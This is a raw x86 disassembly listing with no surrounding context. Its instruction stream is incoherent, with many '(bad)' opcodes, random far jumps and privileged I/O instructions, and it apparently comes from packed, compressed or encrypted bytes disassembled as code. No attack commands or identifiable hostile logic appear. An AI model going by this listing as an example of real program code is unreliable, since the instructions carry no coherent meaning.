  4177b9:	out    dx,eax
  4177ba:	les    esi,FWORD PTR [ecx+0x1af3163c]
  4177c0:	adc    ah,BYTE PTR [ebx-0x47ea5cbe]
  4177c6:	scas   al,BYTE PTR es:[edi]
  4177c7:	(bad)  
  4177c8:	jnp    0x41777d
  4177ca:	clc    
  4177cb:	enter  0x823b,0x6f
  4177cf:	ins    BYTE PTR es:[edi],dx
  4177d0:	jne    0x4177e4
  4177d2:	cs scas eax,DWORD PTR es:[edi]
  4177d4:	call   0x8ace:0x4186c48
  4177db:	push   eax
  4177dc:	stos   BYTE PTR es:[edi],al
  4177dd:	mov    ebp,0xb95af10e
  4177e2:	adc    bh,BYTE PTR [ecx+0x10a2c89c]
  4177e8:	add    al,0x69
  4177ea:	or     edx,0x7c
  4177ed:	pop    es
  4177ee:	cmp    BYTE PTR [ebp-0x652623dc],0x68
  4177f5:	mov    bh,0x41
  4177f7:	out    dx,al
  4177f8:	xchg   DWORD PTR [esi+eiz*1],ecx
  4177fb:	sub    al,0x7b
  4177fd:	out    dx,eax
  4177fe:	mov    ah,dh
  417800:	ss test eax,0x831788a3
  417806:	mov    bl,BYTE PTR [edi+edx*2+0x445fcbaa]
  41780d:	ret    
  41780e:	mov    ds:0xbbd3d974,eax
  417813:	and    eax,0x5ce213da
  417818:	jo     0x417840
  41781a:	sub    eax,0xad2c2bd4
  41781f:	sub    al,dl
  417821:	and    edi,DWORD PTR [edi+edi*4+0x57]
  417825:	lock add eax,0xb3959d22
  41782b:	mov    ds:0x31e07683,eax
  417830:	cmp    al,0xc9
  417832:	stos   BYTE PTR es:[edi],al
  417833:	in     al,0xc3
  417835:	fyl2xp1 
  417837:	into   
  417838:	adc    eax,0x246d1aa4
  41783d:	jb     0x41780b
  41783f:	stc    
  417840:	int3   
  417841:	xchg   edx,eax
  417842:	imul   eax
  417844:	mov    esp,0x9a2c6c35
  417849:	xchg   esp,eax
  41784a:	retf   
  41784b:	sbb    esp,edi
  41784d:	push   ecx
  41784e:	shl    DWORD PTR [ecx-0x6c],1
  417851:	pop    es
  417852:	(bad)  
  417853:	pop    edi
  417854:	mov    cs,WORD PTR [esi]
  417856:	add    al,BYTE PTR [ecx+0x18]
  417859:	add    eax,0xbbdc2f3d
  41785e:	xchg   ecx,eax
  41785f:	push   0x1563fd7
  417864:	sub    BYTE PTR [esi+ebp*8+0x58],cl
  417868:	xor    al,0xed
  41786a:	imul   ebp,DWORD PTR [edx],0x40ee0c91
  417870:	fsub   DWORD PTR [edi+ebp*8]
  417873:	in     al,dx
  417874:	fidivr DWORD PTR [ebp+0x28]
  417877:	call   0x20022c67
  41787c:	loope  0x417859
  41787e:	ins    DWORD PTR es:[edi],dx
  41787f:	sar    dh,0x43
  417882:	test   eax,0x5e721085
  417887:	pop    edx
  417888:	hlt    
  417889:	jge    0x4178bf
  41788b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41788c:	je     0x4178d5
  41788e:	cmp    eax,0xb5a3eb70
  417893:	mov    dl,0x45
  417895:	mov    ch,0x5
  417897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417898:	in     eax,dx
  417899:	(bad)  [edi+0x21]
  41789c:	das    
  41789d:	xchg   BYTE PTR [edx-0x7034723b],ch
  4178a3:	inc    esp
  4178a4:	jbe    0x417873
  4178a6:	and    al,0x4d
  4178a8:	fsubr  DWORD PTR [ecx-0x6c1786c2]
  4178ae:	or     DWORD PTR ds:0xb599fb8d,0xd65c2a40
  4178b8:	and    al,0xd3
  4178ba:	xor    ah,BYTE PTR [esi+0x5d1b6a53]
  4178c0:	inc    ecx
  4178c1:	sub    eax,0x58563b2
  4178c6:	xor    eax,ebx
  4178c8:	add    al,0xe8
  4178ca:	cmp    DWORD PTR cs:[esi+0x59],ebx
  4178ce:	ja     0x4178fa
  4178d0:	jmp    0x5aea:0x37fe548e
  4178d7:	imul   edx,DWORD PTR [edx],0x4c
  4178da:	ror    ebp,1
  4178dc:	(bad)  
  4178dd:	repnz dec esp
  4178df:	shl    BYTE PTR [esi+0x22],0xb8
  4178e3:	call   0x3036f105
  4178e8:	in     al,dx
  4178e9:	fdiv   DWORD PTR [esi+0x35fe483e]
  4178ef:	sub    cl,BYTE PTR [eax+0x28b72094]
  4178f5:	sar    dh,1
  4178f7:	dec    esi
  4178f8:	mov    dh,BYTE PTR [ebx+0x1d48e59a]
  4178fe:	mov    BYTE PTR [ebp+0x7e08fa77],bh
  417904:	push   ds
  417905:	mov    edx,0x7aaee811
  41790a:	mov    eax,ds:0xf453a8c4
  41790f:	jae    0x4178a4
  417911:	sar    DWORD PTR [ecx+0x66],0x71
  417915:	inc    ebp
  417916:	dec    esp
  417917:	enter  0x449c,0xad
  41791b:	mov    ebx,0x1f5f951c
  417920:	dec    edi
  417921:	out    0xb8,al
  417923:	lock rcr DWORD PTR [esi+0x3f4d6128],cl
  41792a:	pop    ds
  41792b:	mov    ds:0x5c55f9f,al
  417930:	mov    ecx,0x83bf1bdc
  417935:	dec    ebp
  417936:	fst    DWORD PTR [eax+0x6f28810c]
  41793c:	fst    DWORD PTR [edi+0x1d80be89]
  417942:	push   eax
  417943:	mov    cl,0xd9
  417945:	sbb    ebx,0xffffffa3
  417948:	xor    DWORD PTR [edx],esp
  41794a:	pop    esp
  41794b:	sahf   
  41794c:	lods   al,BYTE PTR ds:[esi]
  41794d:	mov    BYTE PTR [ecx],bl
  41794f:	fdivrp st(4),st
  417951:	sbb    bl,BYTE PTR [edi+ebx*1-0x4c]
  417955:	xchg   DWORD PTR [edx-0x67],eax
  417958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41795a:	fcmovnbe st,st(1)
  41795c:	xor    al,0xac
  41795e:	hlt    
  41795f:	(bad)  
  417961:	mov    ch,0x92
  417963:	sbb    eax,0xab9fe525
  417968:	push   esp
  417969:	call   0xed93d4e9
  41796e:	jns    0x417918
  417970:	(bad)  
  417971:	les    ecx,FWORD PTR [esi-0xf]
  417974:	inc    edi
  417975:	stos   BYTE PTR es:[edi],al
  417976:	cld    
  417977:	fdivr  QWORD PTR [ecx+0x27]
  41797a:	mov    eax,ds:0x8a48a5cb
  41797f:	data16 mov ds:0xfd3a81f9,al
  417985:	fs push es
  417987:	fwait
  417988:	je     0x4179f0
  41798a:	cmp    DWORD PTR [eax],0x43ca0fde
  417990:	retf   
  417991:	dec    edi
  417992:	gs aad 0x95
  417995:	mul    BYTE PTR ds:0x375aa666
  41799b:	cmp    ebp,DWORD PTR [edx-0x7c7d7e50]
  4179a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179a2:	adc    eax,0xd0044940
  4179a7:	pop    eax
  4179a8:	sbb    dl,BYTE PTR [edi+0x1a]
  4179ab:	xlat   BYTE PTR ds:[ebx]
  4179ac:	cdq    
  4179ad:	retf   
  4179ae:	add    edx,edx
  4179b0:	mov    esp,0x6e5d4d62
  4179b5:	inc    edi
  4179b6:	push   es
  4179b7:	(bad)  
  4179b8:	aam    0x2e
  4179ba:	push   es
  4179bb:	aas    
  4179bc:	stos   BYTE PTR es:[edi],al
  4179bd:	inc    ebp
  4179be:	and    al,BYTE PTR [edi-0xe]
  4179c1:	call   0xe8a:0xb0fa1376
  4179c8:	and    dh,BYTE PTR [ebp+0x7e75134f]
  4179ce:	icebp  
  4179cf:	dec    ecx
  4179d0:	sahf   
  4179d1:	test   al,0xe1
  4179d3:	ds pushf 
  4179d5:	ret    0x3277
  4179d8:	xchg   edi,eax
  4179d9:	out    0xd6,al
  4179db:	test   BYTE PTR [eax+0x53],dl
  4179de:	xor    al,0x75
  4179e0:	adc    eax,0xb679467e
  4179e5:	dec    esp
  4179e6:	stos   DWORD PTR es:[edi],eax
  4179e7:	mov    bl,0x3
  4179e9:	jl     0x4179d6
  4179eb:	popa   
  4179ec:	sahf   
  4179ed:	sar    BYTE PTR [esi+0x59],cl
  4179f0:	test   al,0x2c
  4179f2:	ins    DWORD PTR es:[edi],dx
  4179f3:	xchg   esp,ecx
  4179f5:	fucomp st(0)
  4179f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179f8:	mov    ebp,ecx
  4179fa:	add    bh,BYTE PTR [ebx]
  4179fc:	aam    0x77
  4179fe:	pop    esp
  4179ff:	imul   ecx,DWORD PTR [eax+0x5f],0x54
  417a03:	xchg   esp,eax
  417a04:	cmc    
  417a05:	jl     0x417a60
  417a07:	sbb    edx,esp
  417a09:	push   ss
  417a0a:	int    0x27
  417a0c:	cwde   
  417a0d:	mov    ch,0x9f
  417a0f:	cs sti 
  417a11:	xor    eax,0xc2207a3a
  417a16:	inc    eax
  417a17:	jns    0x417a0f
  417a19:	sbb    BYTE PTR [ecx-0x5a19ec5b],0xc5
  417a20:	mov    eax,ds:0x1b4f873b
  417a25:	inc    eax
  417a26:	frstor [ecx+0xf97bd11]
  417a2c:	jmp    0x3560b8a8
  417a31:	adc    al,0xa7
  417a33:	xchg   ecx,eax
  417a34:	jb     0x4179f7
  417a36:	das    
  417a37:	lods   al,BYTE PTR ds:[esi]
  417a38:	xchg   DWORD PTR [edx+0x1c],esp
  417a3b:	pop    edx
  417a3c:	xchg   edi,eax
  417a3d:	jmp    0x417a22
  417a3f:	xchg   BYTE PTR [ebx+0x4b],bh
  417a42:	in     eax,dx
  417a43:	jecxz  0x417a44
  417a45:	cmp    cl,BYTE PTR [ebp+0x3b8a23b8]
  417a4b:	push   ebp
  417a4c:	setge  BYTE PTR [edx-0x14954eb3]
  417a53:	adc    al,0xd6
  417a55:	rcl    BYTE PTR [edx-0x41],0x80
  417a59:	mov    esp,0x93b0db2b
  417a5e:	xchg   ebx,esp
  417a60:	push   edi
  417a61:	xchg   esp,eax
  417a62:	ret    
  417a63:	pop    ecx
  417a64:	ins    BYTE PTR es:[edi],dx
  417a65:	aam    0x51
  417a67:	cmp    DWORD PTR [ecx-0x52],ebp
  417a6a:	mov    ds:0x19f7a9b4,al
  417a6f:	add    DWORD PTR [eax+ebp*1+0x53],edi
  417a73:	or     ch,BYTE PTR [ebx-0x1721091b]
  417a79:	mov    ah,0xdb
  417a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a7c:	shl    DWORD PTR [ebx-0x3bab66e5],1
  417a82:	mov    ah,0x13
  417a84:	in     eax,dx
  417a85:	into   
  417a86:	cs (bad) 
  417a88:	xchg   ebx,eax
  417a89:	fstp   TBYTE PTR [ebx+0x17]
  417a8c:	rol    DWORD PTR [edi+0x30],cl
  417a8f:	xchg   esp,eax
  417a90:	xor    BYTE PTR [edx],0x68
  417a93:	dec    DWORD PTR [edi-0xab90498]
  417a99:	inc    edx
  417a9a:	sbb    edi,DWORD PTR [ebx-0x5bee60ad]
  417aa0:	shl    DWORD PTR [ebp+0x12bd30be],cl
  417aa6:	jno    0x417aea
  417aa8:	or     dl,dl
  417aaa:	(bad)  
  417aab:	jb     0x417a91
  417aad:	xor    eax,0x489bf5d9
  417ab2:	retf   0x8740
  417ab5:	xchg   esp,eax
  417ab6:	xlat   BYTE PTR ds:[ebx]
  417ab7:	adc    eax,0xebdcc3eb
  417abc:	in     al,dx
  417abd:	sbb    al,0x8e
  417abf:	out    dx,al
  417ac0:	jl     0x417afd
  417ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ac3:	jle    0x417a86
  417ac5:	(bad)  
  417ac6:	fadd   DWORD PTR [edi+ebp*2]
  417ac9:	test   bl,dh
  417acb:	(bad)  
  417acc:	or     bl,dh
  417ace:	xor    dl,0x61
  417ad1:	mov    cl,0x94
  417ad3:	inc    DWORD PTR [ebx]
  417ad5:	add    edi,DWORD PTR [eax-0x62]
  417ad8:	xchg   ecx,eax
  417ad9:	stos   DWORD PTR es:[edi],eax
  417ada:	or     BYTE PTR [ebp+0x38],al
  417add:	out    dx,eax
  417ade:	fsub   QWORD PTR [esi]
  417ae0:	xor    DWORD PTR [ebx],ecx
  417ae2:	shr    DWORD PTR [ecx+edi*4+0x79264de8],0xaf
  417aea:	dec    edx
  417aeb:	and    ebx,DWORD PTR [ecx]
  417aed:	fwait
  417aee:	pop    eax
  417aef:	mov    edi,cs
  417af1:	dec    ebx
  417af2:	rol    bh,cl
  417af4:	dec    edx
  417af5:	sub    ebp,DWORD PTR [edi+0x4c]
  417af8:	xor    eax,0x8eb2778d
  417afd:	add    DWORD PTR [esi+0x4f9049ea],edx
  417b03:	xchg   esi,eax
  417b04:	sar    DWORD PTR [ebp-0x54e460bd],0x2f
  417b0b:	sub    ch,BYTE PTR [ebx+0xd3d7005]
  417b11:	dec    ebp
  417b12:	mov    eax,ds:0x46383571
  417b17:	lock add al,BYTE PTR [edi-0x173757f3]
  417b1e:	not    edx
  417b20:	jns    0x417b9c
  417b22:	lahf   
  417b23:	sub    al,0x7f
  417b25:	mov    edi,0x54df2a39
  417b2a:	mov    al,0xc6
  417b2c:	add    ebx,DWORD PTR [ecx+0x5b89469a]
  417b32:	mov    DWORD PTR ds:0xe3409028,ecx
  417b38:	mov    esi,gs
  417b3a:	inc    edx
  417b3b:	adc    bl,BYTE PTR [ebp-0x1e9e182c]
  417b41:	sub    BYTE PTR [edi-0x66069051],ch
  417b47:	icebp  
  417b48:	rcl    ah,cl
  417b4a:	sbb    esi,DWORD PTR [edi-0x59]
  417b4d:	lahf   
  417b4e:	mov    eax,0xbc27b853
  417b53:	fwait
  417b54:	pop    edi
  417b55:	mov    edx,0xff8a24a2
  417b5a:	adc    eax,0x45cdb920
  417b5f:	loope  0x417af0
  417b61:	inc    ebx
  417b62:	fwait
  417b63:	sbb    ecx,DWORD PTR [ebp+0x1b2f2a17]
  417b69:	lock jle 0x417ba5
  417b6c:	nop
  417b6d:	aad    0xfe
  417b6f:	dec    esi
  417b70:	das    
  417b71:	xchg   edi,eax
  417b72:	test   cl,dl
  417b74:	xchg   edx,eax
  417b75:	xor    al,BYTE PTR [esi+0x9]
  417b78:	dec    ecx
  417b79:	mov    dl,0xe4
  417b7b:	sub    eax,0xd78cc1f7
  417b80:	repz mov gs,WORD PTR [ecx]
  417b83:	jo     0x417bb5
  417b85:	cli    
  417b86:	(bad)  
  417b87:	call   0x13c0:0xbe5b9887
  417b8e:	inc    edx
  417b8f:	fidivr WORD PTR [edx]
  417b91:	push   0x565dd8c7
  417b96:	or     dl,BYTE PTR [ecx]
  417b98:	ins    BYTE PTR es:[edi],dx
  417b99:	mov    edi,0x22eb64c1
  417b9e:	jne    0x417baf
  417ba0:	stos   DWORD PTR es:[edi],eax
  417ba1:	ror    ebx,cl
  417ba3:	dec    BYTE PTR [eax]
  417ba5:	sahf   
  417ba6:	jne    0x417c0d
  417ba8:	or     BYTE PTR [edx+esi*2+0x76],al
  417bac:	jmp    0xa43a:0x3ab54407
  417bb3:	xor    ecx,0xfffffff7
  417bb6:	outs   dx,DWORD PTR ds:[esi]
  417bb7:	xor    DWORD PTR ds:0x957ace4d,ecx
  417bbd:	(bad)  
  417bbe:	es ret 
  417bc0:	mov    edx,0x66b1ffb9
  417bc5:	or     al,0x92
  417bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bc8:	addr16 dec eax
  417bca:	xlat   BYTE PTR ds:[ebx]
  417bcb:	int    0x56
  417bcd:	mov    esi,0x99683ceb
  417bd2:	pop    esi
  417bd3:	mov    ecx,0x86877d26
  417bd8:	addr16 cld 
  417bda:	or     DWORD PTR [edi-0x4],ebx
  417bdd:	repz xlat BYTE PTR ds:[ebx]
  417bdf:	ss pushf 
  417be1:	js     0x417c42
  417be3:	adc    DWORD PTR [ecx-0x70],ebp
  417be6:	pop    ebx
  417be7:	lds    edi,FWORD PTR [edx]
  417be9:	into   
  417bea:	add    cl,cl
  417bec:	pop    ebp
  417bed:	pusha  
  417bee:	(bad)  
  417bef:	out    0xc7,eax
  417bf1:	xor    esp,DWORD PTR [edi]
  417bf3:	dec    ebx
  417bf4:	(bad)  
  417bf5:	pop    esi
  417bf6:	mov    al,ds:0x90c913ee
  417bfb:	repz and BYTE PTR [eax+edi*1-0x72b901d2],bh
  417c03:	stc    
  417c04:	ret    
  417c05:	(bad)  
  417c06:	add    DWORD PTR [edx],ecx
  417c08:	mov    ch,0x8a
  417c0a:	aad    0xbb
  417c0c:	adc    bh,BYTE PTR ds:0x5f923c82
  417c12:	adc    al,0x43
  417c14:	stc    
  417c15:	imul   esp,esi,0xd5bed545
  417c1b:	rcl    cl,1
  417c1d:	(bad)  
  417c1e:	adc    eax,0x407adec6
  417c23:	mov    bh,0xb3
  417c25:	xlat   BYTE PTR ds:[ebx]
  417c26:	and    bh,bh
  417c28:	daa    
  417c29:	pushf  
  417c2a:	mov    WORD PTR [ecx+0x22],gs
  417c2d:	jne    0x417c36
  417c2f:	in     al,0x7e
  417c31:	add    eax,0x1deab6a8
  417c36:	test   eax,0xdf8ad329
  417c3b:	xchg   edx,eax
  417c3c:	xor    al,0x7b
  417c3e:	push   ebx
  417c3f:	popa   
  417c40:	cmp    BYTE PTR [esi],0x92
  417c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c44:	jae    0x417c7f
  417c46:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417c48:	push   edi
  417c49:	mov    gs,WORD PTR [ecx+0x6bd3c91f]
  417c4f:	mov    ebp,0x6147c963
  417c54:	sub    dl,BYTE PTR [edi-0x1c2c09c2]
  417c5a:	imul   eax,esp,0xffffffe8
  417c5d:	sbb    bl,BYTE PTR [ebx-0x2a]
  417c60:	lock or al,0x5c
  417c63:	loopne 0x417bf8
  417c65:	loope  0x417c8f
  417c67:	pop    ds
  417c68:	fcmovnbe st,st(0)
  417c6a:	(bad)
  417c6d:	arpl   WORD PTR [esi+0x3c],ax
  417c70:	data16 sbb BYTE PTR [ebx+ecx*8-0x31f7fbe2],cl
  417c78:	stc    
  417c79:	mul    DWORD PTR [ebx]
  417c7b:	cld    
  417c7c:	mov    cl,0x76
  417c7e:	in     eax,dx
  417c7f:	xchg   esi,eax
  417c80:	repz pop edx
  417c82:	mov    eax,0x8ba40c86
  417c87:	adc    edi,esi
  417c89:	loop   0x417cbc
  417c8b:	pop    ebx
  417c8c:	cmc    
  417c8d:	xor    eax,0x7b9f2e8f
  417c92:	add    al,0x37
  417c94:	cmp    bh,al
  417c96:	jne    0x417d0b
  417c98:	sub    bl,bl
  417c9a:	fwait
  417c9b:	(bad)  
  417c9c:	(bad)  
  417c9e:	lods   al,BYTE PTR ds:[esi]
  417c9f:	jmp    DWORD PTR es:0xd2eb8e8a
  417ca6:	(bad)  
  417ca7:	aad    0x1c
  417ca9:	dec    ecx
  417caa:	call   0xcb4a:0xeebaf69a
  417cb1:	and    ebp,DWORD PTR [ebx+ebp*8+0x8]
  417cb5:	lock loop 0x417cee
  417cb8:	xor    BYTE PTR [ecx+0x3a6b1d5f],bl
  417cbe:	jmp    0x1b24:0x188baa52
  417cc5:	dec    ebp
  417cc6:	push   ebp
  417cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cc8:	or     bh,ch
  417cca:	push   esi
  417ccb:	push   ss
  417ccc:	push   es
  417ccd:	in     eax,dx
  417cce:	(bad)  
  417ccf:	mov    ebx,0x45155559
  417cd4:	xchg   esp,eax
  417cd5:	adc    bh,BYTE PTR [eax]
  417cd7:	les    ebx,FWORD PTR ss:[edi+0x3d]
  417cdb:	shl    BYTE PTR [ecx-0x6ac1a7ab],0x33
  417ce2:	imul   esi,DWORD PTR cs:[eax+0x3c9b9d5b],0x2a
  417cea:	shl    ebp,0x1
  417ced:	retf   
  417cee:	mov    eax,ds:0xc6afe103
  417cf3:	iret   
  417cf4:	gs ds jb 0x417d01
  417cf8:	xor    DWORD PTR ds:0xaa8b2306,ebx
  417cfe:	jge    0x417d0f
  417d00:	fld    TBYTE PTR [di-0xa]
  417d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d05:	sub    al,0x18
  417d07:	push   ebx
  417d08:	pop    eax
  417d09:	lods   eax,DWORD PTR ds:[esi]
  417d0a:	mov    ds:0x6acbf158,eax
  417d0f:	test   eax,0x62c88c0d
  417d14:	mov    eax,0x40cf2e8e
  417d19:	ja     0x417c9d
  417d1b:	or     eax,0x22f85fc5
  417d20:	or     BYTE PTR [esi-0x6a6b58eb],bl
  417d26:	cld    
  417d27:	rcr    DWORD PTR [ecx],cl
  417d29:	fidiv  WORD PTR [ecx-0x4d]
  417d2c:	cmp    DWORD PTR [esi],0x93ce25bd
  417d32:	mov    DWORD PTR [edx-0x15263fc1],ebx
  417d38:	mov    edi,0x51f4232f
  417d3d:	cmp    DWORD PTR [ecx+edi*2-0x4a],eax
  417d41:	mov    bh,0xc7
  417d43:	(bad)
  417d47:	cmp    dl,BYTE PTR [eax-0x41]
  417d4a:	not    BYTE PTR [ebp-0x80]
  417d4d:	shl    BYTE PTR [ecx+ebx*2+0x23],cl
  417d51:	loopne 0x417d87
  417d53:	xchg   BYTE PTR [esi],bl
  417d55:	(bad)  
  417d57:	sahf   
  417d58:	(bad)  
  417d59:	mov    esp,0x897bc0c3
  417d5e:	mov    ah,0x71
  417d60:	jp     0x417dd0
  417d62:	xor    edx,0xfffffff0
  417d65:	sub    BYTE PTR [ecx+0x3d],bh
  417d68:	push   0x32
  417d6a:	xchg   edi,eax
  417d6b:	repz push ds
  417d6d:	lds    edx,FWORD PTR [ecx]
  417d6f:	fnstenv [eax]
  417d71:	push   edi
  417d72:	arpl   sp,di
  417d74:	and    eax,0x1f463e69
  417d79:	xchg   esi,eax
  417d7a:	or     DWORD PTR [edx+0x78],eax
  417d7d:	mov    dl,0xf2
  417d7f:	cmp    ecx,ebp
  417d81:	pop    es
  417d82:	xor    ah,0x38
  417d85:	sub    BYTE PTR [ebp-0x7ffcf3c8],bl
  417d8b:	popa   
  417d8c:	sbb    ah,BYTE PTR [edi+edi*2+0x306023f7]
  417d93:	rol    BYTE PTR [ecx+0x2e],1
  417d96:	(bad)  
  417d97:	stc    
  417d98:	cmp    BYTE PTR [eax],bh
  417d9a:	shl    BYTE PTR [edi],0xb7
  417d9d:	lock mov bh,BYTE PTR [ebp+0x20d94db0]
  417da4:	retf   
  417da5:	pop    ebp
  417da6:	adc    dl,BYTE PTR [edi-0x56]
  417da9:	add    edx,DWORD PTR [edx+0x5eea7f23]
  417daf:	rcl    DWORD PTR [ebx],cl
  417db1:	xchg   edi,eax
  417db2:	test   DWORD PTR [ecx],edx
  417db4:	inc    edi
  417db5:	frstor ds:0x37b74d45
  417dbb:	adc    esp,DWORD PTR [edi+0x35]
  417dbe:	repz int 0xd3
  417dc1:	inc    ebp
  417dc2:	cld    
  417dc3:	or     eax,0xe2c5ffb4
  417dc8:	xor    bl,ch
  417dca:	jle    0x417d5e
  417dcc:	mov    edx,ss
  417dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dcf:	inc    esp
  417dd0:	or     eax,0xcccfae84
  417dd5:	xchg   edx,eax
  417dd6:	dec    edi
  417dd7:	les    edx,FWORD PTR [ecx-0x40]
  417dda:	mov    bl,0xc0
  417ddc:	adc    ebp,esi
  417dde:	push   ecx
  417ddf:	das    
  417de0:	mov    ah,BYTE PTR [edi+0x468eca85]
  417de6:	pop    esi
  417de7:	and    eax,DWORD PTR [ebx+0x5f]
  417dea:	in     eax,dx
  417deb:	test   ecx,eax
  417ded:	sub    BYTE PTR [edx-0x28],ah
  417df0:	mov    ah,BYTE PTR [edi+0xae04ed2]
  417df6:	jmp    0x417dbf
  417df8:	es mov ecx,0x5a050658
  417dfe:	int3   
  417dff:	sbb    esp,DWORD PTR ds:0x95dbe31e
  417e05:	pop    ds
  417e06:	rcl    BYTE PTR [edi],cl
  417e08:	mov    bh,0x5c
  417e0a:	jnp    0x417dd1
  417e0c:	ret    0x25a
  417e0f:	or     eax,0xb8a26fa7
  417e14:	loopne 0x417dea
  417e16:	jnp    0x417e2c
  417e18:	mov    ds:0x639b5c31,eax
  417e1d:	dec    ebp
  417e1e:	or     dh,BYTE PTR ds:0x80f2357b
  417e24:	mov    ebx,0xd6d1949f
  417e29:	cmp    BYTE PTR [ebp-0x73],ch
  417e2c:	adc    edx,esi
  417e2e:	jnp    0x417dd3
  417e30:	or     BYTE PTR [ecx],0x5
  417e33:	popf   
  417e34:	ds in  eax,dx
  417e36:	scas   eax,DWORD PTR es:[edi]
  417e37:	xchg   BYTE PTR ds:0xd49983f,al
  417e3d:	shl    BYTE PTR [ebx+0x50f7d776],0x2c
  417e44:	jecxz  0x417def
  417e46:	jmp    0xb9fc:0xaabf283c
  417e4d:	and    ah,bh
  417e4f:	or     eax,0x78b21019
  417e54:	and    BYTE PTR [edx],al
  417e56:	inc    edi
  417e57:	int3   
  417e58:	jp     0x417e71
  417e5a:	dec    edi
  417e5b:	cli    
  417e5c:	fisub  WORD PTR [edi+0x46]
  417e5f:	adc    DWORD PTR [eax],esp
  417e61:	les    ebp,FWORD PTR [eax+0x6b]
  417e64:	xchg   ecx,eax
  417e65:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417e67:	daa    
  417e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e69:	mov    dh,0x75
  417e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e6c:	outs   dx,DWORD PTR ds:[esi]
  417e6d:	sbb    al,0x66
  417e6f:	(bad)  
  417e70:	and    dh,dl
  417e72:	jle    0x417e58
  417e74:	test   eax,0x4d684b1b
  417e79:	push   cs
  417e7a:	inc    ebx
  417e7b:	sub    DWORD PTR [edx+0x37],edx
  417e7e:	test   eax,0x949a4df1
  417e83:	outs   dx,BYTE PTR ds:[esi]
  417e84:	inc    ebx
  417e85:	push   eax
  417e86:	cmc    
  417e87:	dec    esi
  417e88:	in     al,0x4e
  417e8a:	ss jae 0x417eed
  417e8d:	xchg   esp,eax
  417e8e:	fwait
  417e8f:	cmp    eax,0x81b1c1f5
  417e94:	(bad)  
  417e95:	cmp    cl,BYTE PTR [edx]
  417e97:	push   0x1fd5441e
  417e9c:	jge    0x417e84
  417e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e9f:	sar    BYTE PTR [ecx],cl
  417ea1:	lds    eax,FWORD PTR [eax]
	...
  41807b:	add    BYTE PTR [eax],al
  41807d:	add    BYTE PTR [eax+ebx*1-0x2923a928],bl
  418084:	sahf   
  418085:	fidivr DWORD PTR [esi-0x64]
  418088:	add    al,ah
  41808a:	shr    ah,cl
  41808c:	xchg   DWORD PTR [ebx+0x5b],ebp
  41808f:	mov    al,0x1
  418091:	add    BYTE PTR [edx],ah
  418093:	pop    es
  418094:	add    BYTE PTR [eax],al
  418096:	popf   
  418097:	or     ah,0xc9
  41809a:	xor    al,0x7a
  41809c:	or     ch,dl
  41809e:	mov    fs,WORD PTR [ecx-0x73ca17fb]
  4180a4:	call   0x15b7:0x74ce7398
  4180ab:	dec    edx
  4180ac:	xlat   BYTE PTR ds:[ebx]
  4180ad:	(bad)  
  4180ae:	ja     0x41810a
  4180b0:	push   ecx
  4180b1:	es mov esi,0xc30c0ca2
  4180b7:	fistp  WORD PTR [edi-0x69475c76]
  4180bd:	rol    DWORD PTR [ecx],1
  4180bf:	inc    ebp
  4180c0:	ja     0x4180a4
  4180c2:	inc    edi
  4180c3:	cld    
  4180c4:	test   al,0x58
  4180c6:	sub    eax,0x7fc5b434
  4180cb:	fld    TBYTE PTR [ecx+0x3e02074]
  4180d2:	pop    ds
  4180d3:	jb     0x418096
  4180d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180d6:	out    0x35,eax
  4180d8:	and    BYTE PTR [edx+0x25dc4338],bl
  4180de:	jp     0x418153
  4180e0:	add    al,0xf8
  4180e2:	pop    edi
  4180e3:	stos   DWORD PTR es:[edi],eax
  4180e4:	shl    DWORD PTR [edi+0x55],cl
  4180e7:	mov    ebx,?
  4180e9:	and    al,0xb7
  4180eb:	rcl    BYTE PTR [edi],0x3
  4180ee:	push   0x4c9b89d5
  4180f3:	enter  0x8d97,0x7e
  4180f7:	mov    ecx,0x1317ed4e
  4180fc:	mov    dh,0xf8
  4180fe:	mov    BYTE PTR [ebx],0x5b
  418101:	add    bl,ch
  418103:	push   esi
  418104:	add    BYTE PTR [esi+esi*1+0x29],al
  418108:	(bad)
  41810b:	std    
  41810c:	push   0x56974b95
  418111:	popa   
  418112:	xchg   esp,eax
  418113:	dec    ebp
  418114:	and    DWORD PTR ds:0xb68a38d9,ebp
  41811a:	test   DWORD PTR [ecx+0x4fe963dd],ebx
  418120:	and    al,0x18
  418122:	mov    esp,0x74f2e8bf
  418127:	je     0x418143
  418129:	jp     0x418100
  41812b:	and    esi,esi
  41812d:	mov    ds:0x1ef809d4,al
  418132:	fwait
  418133:	jns    0x418138
  418135:	sti    
  418136:	mov    bh,0xcd
  418138:	sbb    eax,0xa67e8825
  41813d:	int3   
  41813e:	fdivr  DWORD PTR [eax]
  418140:	jne    0x418192
  418142:	cli    
  418143:	or     edx,eax
  418145:	push   ss
  418146:	jns    0x4181a9
  418148:	std    
  418149:	nop
  41814a:	rol    BYTE PTR [ebx],0x7d
  41814d:	sub    dh,BYTE PTR [esp+ebx*1-0xa68a692]
  418154:	daa    
  418155:	xchg   DWORD PTR [eax-0x7249700e],ebp
  41815b:	lds    ebp,FWORD PTR [edx+0x3]
  41815e:	mov    ah,BYTE PTR [ebp+0x2eaef1e2]
  418164:	rol    DWORD PTR [edi+0x5af127b0],1
  41816a:	push   edx
  41816b:	jmp    0x9310:0x11cf24f
  418172:	shl    DWORD PTR [edi],1
  418174:	or     DWORD PTR [esi],ebx
